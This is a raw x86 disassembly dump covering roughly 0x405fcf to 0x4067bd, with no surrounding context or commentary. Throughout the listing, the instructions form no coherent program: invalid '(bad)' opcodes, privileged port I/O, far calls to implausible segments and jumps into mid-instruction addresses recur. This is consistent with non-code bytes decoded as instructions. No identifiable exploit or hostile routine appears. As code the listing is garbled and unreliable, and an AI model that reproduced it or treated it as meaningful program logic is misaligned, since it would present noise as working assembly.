  405fcf:	sbb    BYTE PTR [edi+0x7c],al
  405fd2:	sub    al,bl
  405fd4:	jp     0x40600b
  405fd6:	ja     0x40604e
  405fd8:	mov    cl,0xd9
  405fda:	loopne 0x40602d
  405fdc:	mov    eax,ds:0x5acd0e1c
  405fe1:	mov    ebp,ecx
  405fe3:	pop    es
  405fe4:	je     0x40605d
  405fe6:	sbb    eax,0xf84d4e1a
  405feb:	cli    
  405fec:	xchg   edi,eax
  405fed:	inc    ebp
  405fee:	xchg   cx,ax
  405ff0:	adc    ah,ah
  405ff2:	pop    ss
  405ff3:	shl    BYTE PTR [eax+edx*2+0x60],1
  405ff7:	je     0x406049
  405ff9:	popf   
  405ffa:	push   cs
  405ffb:	inc    ecx
  405ffc:	mov    es,WORD PTR [esi-0xd]
  405fff:	sbb    DWORD PTR [edi],edx
  406001:	mov    ch,0x36
  406003:	sbb    eax,0x1be00c9
  406008:	xor    dl,dh
  40600a:	add    al,0xe0
  40600c:	jmp    0xdf0686da
  406011:	stos   DWORD PTR es:[edi],eax
  406012:	call   0x80c2:0xe78d4610
  406019:	int3   
  40601a:	leave  
  40601b:	out    dx,eax
  40601c:	push   edx
  40601d:	loopne 0x405fc6
  40601f:	std    
  406020:	pop    edx
  406021:	lods   eax,DWORD PTR ds:[esi]
  406022:	and    DWORD PTR [edi],ebx
  406024:	gs enter 0x6aa7,0xa4
  406029:	iret   
  40602a:	outs   dx,DWORD PTR ds:[esi]
  40602b:	or     al,0x64
  40602d:	sub    eax,0x6859e9d
  406032:	sub    al,0xf
  406034:	or     al,0xe4
  406036:	sbb    DWORD PTR [esi],ecx
  406038:	sti    
  406039:	xchg   ebx,eax
  40603a:	mov    bh,0x50
  40603c:	stos   DWORD PTR es:[edi],eax
  40603d:	jb     0x40603a
  40603f:	(bad)
  406042:	pop    ebp
  406043:	retf   0x4b9d
  406046:	loop   0x405fde
  406048:	adc    DWORD PTR [eax+0x3c],eax
  40604b:	int    0x3a
  40604d:	add    eax,edi
  40604f:	dec    edi
  406050:	repnz sub BYTE PTR [ebx+0x3ce665a7],0x1c
  406058:	xchg   edi,eax
  406059:	in     al,dx
  40605a:	icebp  
  40605b:	xor    dh,BYTE PTR [ecx]
  40605d:	xchg   BYTE PTR [esi-0x16],bl
  406060:	jecxz  0x405fe2
  406062:	push   ss
  406063:	loopne 0x406085
  406065:	sbb    eax,0xffffffa9
  406068:	xor    al,0x16
  40606a:	mov    edx,0xee3ac929
  40606f:	ins    BYTE PTR es:[edi],dx
  406070:	lds    edx,FWORD PTR [esi-0x62]
  406073:	shl    BYTE PTR [edi],1
  406075:	jo     0x4060dd
  406077:	xor    dl,BYTE PTR fs:[eax+0x6]
  40607b:	jle    0x40604e
  40607d:	inc    eax
  40607e:	pusha  
  40607f:	xlat   BYTE PTR ds:[ebx]
  406080:	cmp    BYTE PTR [esi],0x92
  406083:	sar    DWORD PTR [ecx+ecx*1-0x5dc106a7],1
  40608a:	fbstp  TBYTE PTR [eax+0x5761de47]
  406090:	jle    0x406086
  406092:	data16 sti 
  406094:	mov    ch,0x40
  406096:	enter  0x1b0a,0x63
  40609a:	add    esp,DWORD PTR [esp+edx*4-0x3f9045c3]
  4060a1:	imul   edx,DWORD PTR [ebx+0x27dd5982],0xa72dc760
  4060ab:	popf   
  4060ac:	sti    
  4060ad:	jp     0x4060fa
  4060af:	push   edi
  4060b0:	add    dl,BYTE PTR [edx+0x79]
  4060b3:	xchg   ebx,eax
  4060b4:	test   eax,0xe118c1e9
  4060b9:	mov    ds:0x5d71d031,eax
  4060be:	pushf  
  4060bf:	test   DWORD PTR [esi+0x0],ebp
  4060c2:	and    cl,BYTE PTR [edx+0x2d614e2c]
  4060c8:	loope  0x406080
  4060ca:	mov    dl,0xcd
  4060cc:	jns    0x40612e
  4060ce:	and    dl,0xe4
  4060d1:	scas   eax,DWORD PTR es:[edi]
  4060d2:	jmp    0x40606e
  4060d4:	inc    ebp
  4060d5:	push   0xcd2626d2
  4060da:	mov    dh,0xb6
  4060dc:	adc    ch,bl
  4060de:	lds    edi,FWORD PTR [ebp-0x7d17e5e4]
  4060e4:	add    DWORD PTR [edi-0x5e],edx
  4060e7:	es add edx,eax
  4060ea:	mov    dh,0x6c
  4060ec:	add    eax,0xfd82627f
  4060f1:	test   al,ch
  4060f3:	xor    ah,BYTE PTR [ecx]
  4060f5:	jg     0x40612f
  4060f7:	fsubr  DWORD PTR [edx-0x2a]
  4060fa:	(bad)  
  4060fb:	(bad)  
  4060fd:	in     eax,0x8e
  4060ff:	mov    ds:0x28cf4221,al
  406104:	push   ecx
  406105:	push   ebp
  406106:	pop    ebx
  406107:	cld    
  406108:	je     0x4060d1
  40610a:	add    bl,cl
  40610c:	xchg   esp,eax
  40610d:	cmp    DWORD PTR [edi-0x54c14731],0x910a066
  406117:	lea    edi,[ebx]
  406119:	aad    0x5c
  40611b:	xor    edx,DWORD PTR [ebx-0x49c683c6]
  406121:	xchg   esp,eax
  406122:	pop    ss
  406123:	mov    ds:0xe45c77f8,al
  406128:	loopne 0x406100
  40612a:	imul   ecx,DWORD PTR [ebx],0xffffff97
  40612d:	adc    eax,0x905c8057
  406132:	dec    edx
  406133:	or     cl,BYTE PTR ds:[ecx-0x62]
  406137:	(bad)  
  406138:	push   ecx
  406139:	mov    esi,0x7857a83b
  40613e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40613f:	xchg   ebx,eax
  406140:	and    BYTE PTR [eax],dh
  406142:	add    BYTE PTR [ebx+0x1f],al
  406145:	mov    cl,BYTE PTR [edx]
  406147:	popf   
  406148:	(bad)  
  406149:	xchg   esi,eax
  40614a:	cmp    ah,BYTE PTR ds:0xc6af7ace
  406150:	cmp    al,0xac
  406152:	jo     0x4061d3
  406154:	push   ebx
  406155:	mul    DWORD PTR [ebp-0x20]
  406158:	ds (bad) 
  40615a:	fdivr  QWORD PTR [eax]
  40615c:	rcl    BYTE PTR [ecx],0x8d
  40615f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406160:	neg    DWORD PTR [esi+0x66150060]
  406166:	pop    esi
  406167:	ds call 0xa242dd17
  40616d:	inc    ecx
  40616e:	test   DWORD PTR [ecx],eax
  406170:	sbb    al,0xe7
  406172:	or     dh,al
  406174:	jle    0x40616b
  406176:	repnz mov WORD PTR [edx],fs
  406179:	pop    esi
  40617a:	xor    al,0xb6
  40617c:	add    esi,eax
  40617e:	mov    cl,0xde
  406180:	adc    dh,ah
  406182:	push   ebx
  406183:	jbe    0x406170
  406185:	or     BYTE PTR [edi-0x43],0x96
  406189:	cmp    eax,0x8116e5d
  40618e:	dec    esp
  40618f:	cli    
  406190:	loop   0x4061ba
  406192:	push   ecx
  406193:	ret    
  406194:	js     0x406151
  406196:	icebp  
  406197:	ss js  0x406204
  40619a:	out    0x55,eax
  40619c:	cmp    DWORD PTR [eax],eax
  40619e:	dec    eax
  40619f:	sub    BYTE PTR [esp+edi*1],0x22
  4061a3:	aad    0x62
  4061a5:	or     bh,ch
  4061a7:	or     dh,0x5b
  4061aa:	mov    edi,0xcae18dcb
  4061af:	in     al,0x73
  4061b1:	into   
  4061b2:	or     BYTE PTR [ebx+0x2f88d8f2],dh
  4061b8:	lea    edi,[ebp+0x5b]
  4061bb:	call   DWORD PTR [edi+eiz*2+0x36]
  4061bf:	and    eax,0xa1b88f73
  4061c4:	add    edx,ebp
  4061c6:	fistp  QWORD PTR [edx+0x10]
  4061c9:	lods   eax,DWORD PTR ds:[esi]
  4061ca:	idiv   edx
  4061cc:	pop    ds
  4061cd:	sbb    DWORD PTR [esi+0x710d6ab],ebx
  4061d3:	outs   dx,BYTE PTR ds:[esi]
  4061d4:	int3   
  4061d5:	push   ds
  4061d6:	mov    al,0xc
  4061d8:	mov    ecx,DWORD PTR [edi]
  4061da:	mov    edx,0x4af85c4a
  4061df:	pop    ecx
  4061e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061e1:	jo     0x406189
  4061e3:	push   ebx
  4061e4:	or     ah,ah
  4061e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061e7:	pop    edx
  4061e8:	push   ebp
  4061e9:	inc    ebx
  4061ea:	dec    ecx
  4061eb:	jno    0x4061b1
  4061ed:	ins    BYTE PTR es:[edi],dx
  4061ee:	jnp    0x406264
  4061f0:	retf   
  4061f1:	push   edx
  4061f2:	test   eax,0xcaca8407
  4061f7:	inc    ebp
  4061f8:	sbb    DWORD PTR [edi+0x39],ebp
  4061fb:	in     al,dx
  4061fc:	mov    edi,0x3a3c4299
  406201:	push   ss
  406202:	xchg   ebp,eax
  406203:	sahf   
  406204:	dec    eax
  406205:	out    0x7b,al
  406207:	gs add esp,DWORD PTR gs:[ebx]
  40620b:	int3   
  40620c:	(bad)  
  40620d:	adc    BYTE PTR [edx+0x255a266a],bl
  406213:	imul   ebx,DWORD PTR [edx+0x68d53956],0x97899961
  40621d:	in     al,dx
  40621e:	pusha  
  40621f:	stc    
  406220:	xchg   esi,eax
  406221:	inc    esp
  406222:	push   edi
  406223:	fnsave [edi+0x67]
  406226:	stos   DWORD PTR es:[edi],eax
  406227:	xor    DWORD PTR [ebx],edx
  406229:	or     edx,DWORD PTR [esi-0x37]
  40622c:	or     BYTE PTR [edi],cl
  40622e:	bnd ja 0x4061fa
  406231:	jp     0x40624d
  406233:	jae    0x4061e1
  406235:	icebp  
  406236:	jg     0x4061be
  406238:	shr    DWORD PTR [esi-0x20],1
  40623b:	out    dx,al
  40623c:	std    
  40623d:	and    esi,esi
  40623f:	rcl    BYTE PTR [edi-0x33659c46],0x62
  406246:	mov    ah,0x88
  406248:	mov    ds:0x1d58f979,eax
  40624d:	mov    ebx,0x1a98003a
  406252:	pop    edx
  406253:	dec    esi
  406254:	xchg   edx,eax
  406255:	test   eax,0x150c3c06
  40625a:	fwait
  40625b:	add    al,0xc0
  40625d:	in     al,0xd6
  40625f:	and    DWORD PTR [edx+0x15],edi
  406262:	in     eax,0x8e
  406264:	sbb    eax,0x3dac7af8
  406269:	adc    al,bh
  40626b:	cmp    edi,DWORD PTR [edi+0x5c]
  40626e:	mov    bh,0xfe
  406270:	sbb    DWORD PTR [ebx],0x803599f5
  406276:	js     0x4062d5
  406278:	and    DWORD PTR [ecx+0x1a3d2a2c],ecx
  40627e:	mov    ebx,DWORD PTR [eax]
  406280:	test   BYTE PTR [esi-0x64a300d5],ch
  406286:	inc    edi
  406287:	jmp    0x7b97:0xb8ad956b
  40628e:	mov    eax,0x100ad9ae
  406293:	(bad)  
  406294:	xchg   BYTE PTR [edx],ah
  406296:	xchg   edx,eax
  406297:	mov    edi,es
  406299:	ret    
  40629a:	or     eax,0xa538e708
  40629f:	jmp    DWORD PTR [ebx]
  4062a1:	in     eax,0x88
  4062a3:	iret   
  4062a4:	ins    DWORD PTR es:[edi],dx
  4062a5:	repnz and ebp,0xffffffdd
  4062a9:	lock mov eax,ss:0x2d295971
  4062b0:	mov    edx,edi
  4062b2:	xor    BYTE PTR [ebx+0x3a],ah
  4062b5:	and    DWORD PTR [edx-0x35a6b144],edi
  4062bb:	push   edi
  4062bc:	icebp  
  4062bd:	add    BYTE PTR [ebx+0x3972e7cf],bl
  4062c3:	sub    esp,esp
  4062c5:	addr16 push ss
  4062c7:	sbb    eax,0x8626cc66
  4062cc:	in     al,dx
  4062cd:	jp     0x40627f
  4062cf:	ficomp WORD PTR [ebp-0x53aad59]
  4062d5:	adc    BYTE PTR [ebx+0x4d],dh
  4062d8:	add    eax,0xc55fe2b1
  4062dd:	stos   BYTE PTR es:[edi],al
  4062de:	and    edx,DWORD PTR [eax-0x62f93c73]
  4062e4:	ins    DWORD PTR es:[edi],dx
  4062e5:	enter  0x382f,0xfa
  4062e9:	ffreep st(6)
  4062eb:	mov    dh,0x14
  4062ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062ee:	or     eax,0x112b3a5a
  4062f3:	pop    ecx
  4062f4:	shl    DWORD PTR [edx+ecx*1+0x51],0xb9
  4062f9:	add    DWORD PTR [edi],esi
  4062fb:	pushf  
  4062fc:	jge    0x4062e5
  4062fe:	mov    esi,0x5f3ec823
  406303:	ss cmp eax,0x1ac69b0d
  406309:	push   edx
  40630a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40630b:	pop    esp
  40630c:	adc    eax,0xbc8a4b4d
  406311:	frstor [esi+0x60b554a9]
  406317:	in     eax,dx
  406318:	mov    eax,0xc372410f
  40631d:	add    esi,DWORD PTR [esi+0x17c3a5fc]
  406323:	fwait
  406324:	push   es
  406325:	and    DWORD PTR [esi-0x79860fc2],eax
  40632b:	mov    ebp,0xbdbb1993
  406330:	add    BYTE PTR [esi],dl
  406332:	mov    es,WORD PTR [esi+ebp*8+0x2d610a03]
  406339:	mov    ecx,0x95cdf4b0
  40633e:	daa    
  40633f:	sahf   
  406340:	idiv   edx
  406342:	(bad)  
  406343:	call   0x7206:0x3a62b246
  40634a:	pushf  
  40634b:	fnstsw WORD PTR [ebx+ebp*8-0x75]
  40634f:	add    eax,0x67fe65b2
  406354:	fs ja  0x406360
  406357:	pop    ebp
  406358:	push   ss
  406359:	xor    al,0x32
  40635b:	repz jle 0x4062ea
  40635e:	je     0x406354
  406360:	cdq    
  406361:	nop
  406362:	mov    ebp,0xba1c2b18
  406367:	(bad)  
  406368:	cwde   
  406369:	mov    eax,0xac7fe57d
  40636e:	pop    edi
  40636f:	mov    ebx,0xf2196d4d
  406374:	fwait
  406375:	aad    0x4f
  406377:	jns    0x4063c7
  406379:	scas   al,BYTE PTR es:[edi]
  40637a:	pop    ss
  40637b:	add    bl,BYTE PTR [ebx]
  40637d:	dec    ebx
  40637e:	jnp    0x406350
  406380:	mov    ch,0x2a
  406382:	ror    DWORD PTR [esi-0x64],0x9e
  406386:	push   ebp
  406387:	cwde   
  406388:	mov    eax,ds:0xcf0ee866
  40638d:	push   es
  40638e:	cmp    ebp,DWORD PTR [edx+0x5c2049a0]
  406394:	enter  0x5297,0xa5
  406398:	mov    bl,0xb4
  40639a:	xchg   esi,eax
  40639b:	cld    
  40639c:	das    
  40639d:	pop    esi
  40639e:	popa   
  40639f:	jmp    0xd2930e68
  4063a4:	dec    ecx
  4063a5:	nop
  4063a6:	sub    bl,BYTE PTR ds:0x5d7a4c8c
  4063ac:	cld    
  4063ad:	inc    ecx
  4063ae:	ret    
  4063af:	add    eax,0x394a35dd
  4063b4:	clc    
  4063b5:	fwait
  4063b6:	test   DWORD PTR [ecx-0x41],edx
  4063b9:	cmp    al,0x7d
  4063bb:	aad    0x40
  4063bd:	and    eax,0xf46a44cf
  4063c2:	mov    al,0xed
  4063c4:	aad    0x2a
  4063c6:	inc    eax
  4063c7:	hlt    
  4063c8:	int3   
  4063c9:	push   es
  4063ca:	into   
  4063cb:	xchg   esi,eax
  4063cc:	adc    BYTE PTR [ebx-0x22],ah
  4063cf:	jmp    0x4063ce
  4063d1:	pusha  
  4063d2:	sub    BYTE PTR [ecx],0x5c
  4063d5:	cld    
  4063d6:	adc    edx,DWORD PTR [ecx+edx*1+0x79aff1b9]
  4063dd:	mov    bl,0xdc
  4063df:	popa   
  4063e0:	clc    
  4063e1:	pop    eax
  4063e2:	jmp    0x4063ce
  4063e4:	push   esp
  4063e5:	scas   eax,DWORD PTR es:[edi]
  4063e6:	inc    ebp
  4063e7:	mov    DWORD PTR [edi-0x33],ebx
  4063ea:	ficom  DWORD PTR [edx+0x7e]
  4063ed:	(bad)  
  4063ef:	add    edi,edx
  4063f1:	sbb    esp,0xffffffef
  4063f4:	cmp    al,0xa2
  4063f6:	or     edx,DWORD PTR [ebx+0x737d5676]
  4063fc:	fistp  DWORD PTR [eax-0x5c2577ad]
  406402:	stc    
  406403:	pop    ss
  406404:	popf   
  406405:	out    dx,eax
  406406:	(bad)  
  406408:	sbb    ah,BYTE PTR [edx+0x15]
  40640b:	(bad)  
  40640c:	mov    dl,0xf5
  40640e:	out    dx,eax
  40640f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406410:	sub    al,0x92
  406412:	repnz sar BYTE PTR [ecx],0x22
  406416:	in     eax,dx
  406417:	inc    ecx
  406418:	sub    esi,edi
  40641a:	lock and bl,BYTE PTR [eax]
  40641d:	in     eax,0xd1
  40641f:	sub    BYTE PTR [ebp+0x43],ah
  406422:	shl    DWORD PTR [ebp-0x27],1
  406425:	adc    al,0xbe
  406427:	int    0x70
  406429:	push   ds
  40642a:	or     ch,ch
  40642c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40642d:	leave  
  40642e:	sub    BYTE PTR [ecx+0x1d14eba7],bl
  406434:	fstp   QWORD PTR [edi+0x60]
  406437:	sbb    bh,al
  406439:	ret    0xa4d9
  40643c:	popa   
  40643d:	das    
  40643e:	dec    edi
  40643f:	push   eax
  406440:	adc    eax,0x8bce6ffc
  406445:	fwait
  406446:	xor    BYTE PTR [edi-0x48],dh
  406449:	mov    ah,0x80
  40644b:	pop    edi
  40644c:	add    al,0xa9
  40644e:	inc    edi
  40644f:	test   edx,0x10ecc694
  406455:	les    eax,FWORD PTR [edx+0x5c6871ac]
  40645b:	repz and al,0x54
  40645e:	sub    bl,BYTE PTR fs:[edi+0x72]
  406462:	hlt    
  406463:	test   BYTE PTR [esp+edi*1+0x2a],ch
  406467:	in     al,dx
  406468:	sbb    eax,DWORD PTR [esi]
  40646a:	push   esp
  40646b:	xor    BYTE PTR es:[esp+eiz*4],bl
  40646f:	es loop 0x40649f
  406472:	xchg   ebx,eax
  406473:	fldcw  WORD PTR ds:0x5246ba24
  406479:	push   edx
  40647a:	or     BYTE PTR [eax+0x4b3c7f4],al
  406480:	xchg   esi,eax
  406481:	aam    0xc7
  406483:	inc    ecx
  406484:	xchg   esp,eax
  406485:	pop    ebp
  406486:	loop   0x40648d
  406488:	out    dx,al
  406489:	inc    esp
  40648a:	stc    
  40648b:	loop   0x40645a
  40648d:	pop    eax
  40648e:	xchg   edi,eax
  40648f:	jmp    0x406456
  406491:	in     eax,dx
  406492:	ds stos BYTE PTR es:[edi],al
  406494:	in     al,dx
  406495:	pop    ecx
  406496:	test   BYTE PTR [eax+0x61],bl
  406499:	shl    BYTE PTR [ebp+0x34],0xa3
  40649d:	addr16 dec edi
  40649f:	ret    0xb046
  4064a2:	sahf   
  4064a3:	xchg   ecx,eax
  4064a4:	jmp    0xa357:0x6dd79a74
  4064ab:	xor    edi,esi
  4064ad:	stc    
  4064ae:	not    edi
  4064b0:	scas   eax,DWORD PTR es:[edi]
  4064b1:	jg     0x406456
  4064b3:	in     eax,dx
  4064b4:	dec    esp
  4064b5:	fidivr WORD PTR [edx]
  4064b7:	outs   dx,BYTE PTR ds:[esi]
  4064b8:	jmp    0xb50a0008
  4064bd:	ret    
  4064be:	xchg   DWORD PTR [ebx-0x2e],esp
  4064c1:	cld    
  4064c2:	pop    ds
  4064c3:	shl    DWORD PTR [edi-0x1c],cl
  4064c6:	jns    0x40653b
  4064c8:	inc    edx
  4064c9:	cmp    eax,0x22fd5653
  4064ce:	shl    DWORD PTR ds:0x4c48870,0xa4
  4064d5:	adc    DWORD PTR [ebp+0x3f],ebx
  4064d8:	(bad)
  4064db:	outs   dx,DWORD PTR ds:[esi]
  4064dc:	call   0x1a24:0xe2a202ab
  4064e3:	adc    eax,0xb31e9993
  4064e8:	jbe    0x4064d1
  4064ea:	retf   0x107f
  4064ed:	and    BYTE PTR [ecx+0x77],dl
  4064f0:	mov    ds:0x70c8aca6,eax
  4064f5:	sahf   
  4064f6:	mov    bh,0x0
  4064f8:	sti    
  4064f9:	sti    
  4064fa:	das    
  4064fb:	jmp    0xe44f:0x4dfd2ba9
  406502:	lods   eax,DWORD PTR ds:[esi]
  406503:	sar    BYTE PTR [edx],cl
  406505:	sub    bh,al
  406507:	and    BYTE PTR [edi-0x4284a54a],dl
  40650d:	pop    ds
  40650e:	ins    DWORD PTR es:[edi],dx
  40650f:	jb     0x4064c3
  406511:	jp     0x4064d2
  406513:	cwde   
  406514:	push   edi
  406515:	es jle 0x40650e
  406518:	out    dx,al
  406519:	arpl   WORD PTR [edi-0x31],si
  40651c:	stos   DWORD PTR es:[edi],eax
  40651d:	mov    ds:0x39e0870e,eax
  406522:	ret    
  406523:	ins    BYTE PTR es:[di],dx
  406525:	mov    ?,WORD PTR [ebp-0x35272023]
  40652b:	je     0x406511
  40652d:	mov    BYTE PTR [edi],dl
  40652f:	mov    dl,0x59
  406531:	in     al,dx
  406532:	fnstenv [ebp-0x18]
  406535:	test   BYTE PTR [ebx-0x71],ah
  406538:	jnp    0x4064ba
  40653a:	dec    eax
  40653b:	push   esp
  40653c:	bound  edx,QWORD PTR [ecx-0x719d7b83]
  406542:	mov    ebp,0xaff098c7
  406547:	dec    edx
  406548:	aam    0xc7
  40654a:	mov    eax,ds:0x7ac6e996
  40654f:	or     DWORD PTR [ebx+0x390a329a],ebp
  406555:	mov    ah,0xfc
  406557:	pushf  
  406558:	imul   eax,esi,0x75ad72f6
  40655e:	inc    esp
  40655f:	and    al,0xac
  406561:	mov    ds:0x69159c02,al
  406566:	rol    DWORD PTR [edi+eiz*8-0x13],1
  40656a:	retf   0x9ed2
  40656d:	and    BYTE PTR [ebx-0x2d],ah
  406570:	data16 rcr BYTE PTR [ebx+ecx*4+0x11],0x6a
  406576:	xchg   edx,eax
  406577:	dec    ebp
  406578:	jmp    0x406576
  40657a:	lods   eax,DWORD PTR ds:[esi]
  40657b:	mov    edi,0x1940104b
  406580:	dec    edi
  406581:	jg     0x406553
  406583:	xchg   edx,eax
  406584:	xchg   ebx,eax
  406585:	test   DWORD PTR [ebx],0x8f1338ec
  40658b:	push   0xf236700e
  406590:	jno    0x406604
  406592:	lds    ebp,FWORD PTR [esi+0x34]
  406595:	int    0xea
  406597:	rcl    BYTE PTR [edx],1
  406599:	fnclex 
  40659b:	mov    DWORD PTR [ebp-0x137f66c0],edx
  4065a1:	or     eax,0x49c57bca
  4065a6:	mov    WORD PTR [ebx+0x52d2b2d8],ds
  4065ac:	test   DWORD PTR [edx+0x3173d11],ebp
  4065b2:	sahf   
  4065b3:	repnz fmul st,st(5)
  4065b6:	sbb    dh,dl
  4065b8:	fwait
  4065b9:	jp     0x4065c0
  4065bb:	adc    DWORD PTR [edx],edi
  4065bd:	xchg   BYTE PTR [eax-0x50217d40],bl
  4065c3:	mov    cl,0x9a
  4065c5:	mov    ch,0x76
  4065c7:	dec    cx
  4065c9:	push   ds
  4065ca:	bswap  eax
  4065cc:	jno    0x4065e1
  4065ce:	mov    al,0xda
  4065d0:	xchg   edi,eax
  4065d1:	or     al,0xe
  4065d3:	xchg   esp,eax
  4065d4:	sub    dl,bl
  4065d6:	push   edi
  4065d7:	sbb    ecx,DWORD PTR [eax]
  4065d9:	jl     0x406628
  4065db:	cmp    eax,0xc8491233
  4065e0:	jecxz  0x4065a6
  4065e2:	fs jbe 0x406613
  4065e5:	add    eax,0x1ad6b860
  4065ea:	ss sbb eax,0x7ddc3361
  4065f0:	rcl    BYTE PTR [edi-0x10521e92],1
  4065f6:	mov    edi,0xfcf453d6
  4065fb:	stos   DWORD PTR es:[edi],eax
  4065fc:	jg     0x4065f6
  4065fe:	test   cl,bl
  406600:	sub    cl,0xf7
  406603:	dec    eax
  406604:	dec    eax
  406605:	fcom   DWORD PTR [ebx]
  406607:	adc    al,0xa1
  406609:	pusha  
  40660a:	pop    ds
  40660b:	std    
  40660c:	daa    
  40660d:	jb     0x4065bd
  40660f:	pusha  
  406610:	and    al,ch
  406612:	or     DWORD PTR [eax],edx
  406614:	mov    eax,0x39d591fa
  406619:	lea    edi,[ecx+ebx*4+0x72]
  40661d:	nop
  40661e:	(bad)  [esi+esi*1-0x50]
  406622:	sahf   
  406623:	sub    DWORD PTR [eax],ebp
  406625:	imul   ebp,DWORD PTR [edx],0x3cb64fdb
  40662b:	test   BYTE PTR [esp+edx*4-0x2baa895f],bh
  406632:	mov    DWORD PTR [edi],ecx
  406634:	jle    0x406614
  406636:	mov    ecx,0x9368704f
  40663b:	outs   dx,BYTE PTR ds:[esi]
  40663c:	xor    ch,BYTE PTR [esi-0x6ba40317]
  406642:	rol    al,cl
  406644:	(bad)  
  406645:	jl     0x4066a0
  406647:	lds    eax,FWORD PTR ds:0x1ccdc0c0
  40664d:	inc    edi
  40664e:	test   eax,0x679b63fa
  406653:	pop    es
  406654:	adc    BYTE PTR [eax],bh
  406656:	mov    dl,0x84
  406658:	push   edx
  406659:	push   eax
  40665a:	dec    ebx
  40665b:	outs   dx,BYTE PTR ds:[esi]
  40665c:	jno    0x4066c7
  40665e:	imul   esp,DWORD PTR [esi-0x29],0xffffffc4
  406662:	add    edx,DWORD PTR [edi-0x5f0fe955]
  406668:	ret    
  406669:	sub    cl,al
  40666b:	inc    esi
  40666c:	test   BYTE PTR [esp+esi*1],ch
  40666f:	sub    BYTE PTR [ecx+0x5b31cbf4],cl
  406675:	xor    DWORD PTR [eax-0x54],ebx
  406678:	mov    ch,0x14
  40667a:	adc    eax,0x6c06a6cc
  40667f:	cmp    DWORD PTR [eax-0x7b1266f2],0xa18cf4f4
  406689:	mov    DWORD PTR [edx+0x4c],esi
  40668c:	(bad)  
  40668d:	rcr    BYTE PTR [ebx+0x5cab2f6f],cl
  406693:	mov    bl,0x7f
  406695:	sbb    esi,edx
  406697:	xchg   DWORD PTR [edi-0x16],edx
  40669a:	arpl   si,bp
  40669c:	cmp    esp,ebp
  40669e:	jle    0x406659
  4066a0:	mov    ah,0x3c
  4066a2:	and    ebp,ebx
  4066a4:	mov    edi,0x4eb24c13
  4066a9:	jecxz  0x4066ef
  4066ab:	retf   0xf819
  4066ae:	fwait
  4066af:	in     eax,0xbc
  4066b1:	(bad)  
  4066b2:	sub    eax,0x3150b67a
  4066b7:	cmp    DWORD PTR cs:[ecx-0x60f45686],edx
  4066be:	enter  0xf0cd,0x76
  4066c2:	mov    ebp,0xe502eeee
  4066c7:	repz call edi
  4066ca:	cs data16 in al,0x41
  4066ce:	pop    eax
  4066cf:	push   esp
  4066d0:	sub    esp,DWORD PTR [ebx]
  4066d2:	push   es
  4066d3:	stos   BYTE PTR es:[edi],al
  4066d4:	inc    esp
  4066d5:	pushf  
  4066d6:	test   al,0xb5
  4066d8:	das    
  4066d9:	add    DWORD PTR [edi-0x1d],esi
  4066dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066dd:	mov    eax,eax
  4066df:	rcl    DWORD PTR [ebx],cl
  4066e1:	in     al,0xcb
  4066e3:	inc    ecx
  4066e4:	inc    eax
  4066e5:	xchg   esp,eax
  4066e6:	pop    eax
  4066e7:	mov    al,0x69
  4066e9:	jl     0x40667f
  4066eb:	ss or  eax,0xe942267b
  4066f1:	repnz sub dh,al
  4066f4:	lds    eax,FWORD PTR [esp+ebx*2+0x5eeb22b8]
  4066fb:	loopne 0x406736
  4066fd:	xchg   al,cl
  4066ff:	adc    eax,0xaf7a97ba
  406704:	lods   al,BYTE PTR ds:[esi]
  406705:	mov    ds:0xbaa708ba,eax
  40670a:	pop    ecx
  40670b:	jbe    0x4066d5
  40670d:	inc    ecx
  40670e:	or     DWORD PTR [edx+0x25],ebx
  406711:	cmc    
  406712:	and    al,0xfc
  406714:	aad    0x41
  406716:	leave  
  406717:	cmp    cl,BYTE PTR fs:[ebp-0x39]
  40671b:	inc    ebp
  40671c:	daa    
  40671d:	shr    BYTE PTR [ebx+0x7d04136c],cl
  406723:	push   0xcd38d221
  406728:	es xor al,0xf8
  40672b:	cmp    DWORD PTR [edi-0x17],0x6b
  40672f:	je     0x4067a4
  406731:	leave  
  406732:	stos   DWORD PTR es:[edi],eax
  406733:	jb     0x406791
  406735:	sub    al,0xca
  406737:	cs dec edi
  406739:	xor    BYTE PTR [esi],0xf0
  40673c:	imul   esp,DWORD PTR [esi],0xffffffe6
  40673f:	jl     0x406767
  406741:	sar    ebx,0x12
  406744:	jmp    0xa72:0x14542467
  40674b:	je     0x4066e3
  40674d:	rcr    edi,1
  40674f:	stos   DWORD PTR es:[edi],eax
  406750:	fisttp DWORD PTR [edx-0x4546c01d]
  406756:	dec    ebx
  406757:	das    
  406758:	ins    BYTE PTR es:[edi],dx
  406759:	fcmovnbe st,st(7)
  40675b:	mov    esi,0xfb391443
  406760:	mov    DWORD PTR [ebx],esp
  406762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406763:	pop    ebx
  406764:	sbb    BYTE PTR [ebx],ch
  406766:	popa   
  406767:	retf   
  406768:	mov    esp,0x5c45a450
  40676d:	jns    0x40673b
  40676f:	add    DWORD PTR [ebp-0x29],0x75
  406773:	dec    eax
  406774:	pop    ebx
  406775:	jbe    0x406788
  406777:	mov    dh,0xf1
  406779:	push   esp
  40677a:	repz cld 
  40677c:	xor    eax,0xd6e5ce27
  406781:	add    ecx,ebp
  406783:	mov    ?,WORD PTR [eax+0x553fccb5]
  406789:	jb     0x406716
  40678b:	idiv   BYTE PTR [eax-0x10caf8d6]
  406791:	add    BYTE PTR [ebp+0x362b01d],bh
  406797:	cmp    ebx,DWORD PTR [ecx]
  406799:	in     eax,dx
  40679a:	and    dh,BYTE PTR [ebx+0x7452c8ac]
  4067a0:	jae    0x406728
  4067a2:	ds and eax,0xdae850d2
  4067a8:	and    BYTE PTR [eax],ah
  4067aa:	xchg   edi,eax
  4067ab:	mov    ch,0x39
  4067ad:	pop    ss
  4067ae:	push   ebp
  4067af:	jl     0x406776
  4067b1:	shl    al,cl
  4067b3:	in     eax,dx
  4067b4:	test   DWORD PTR [eax-0x39],esi
  4067b7:	enter  0x7d36,0x59
  4067bb:	int    0x80
  4067bd:	pop    ecx
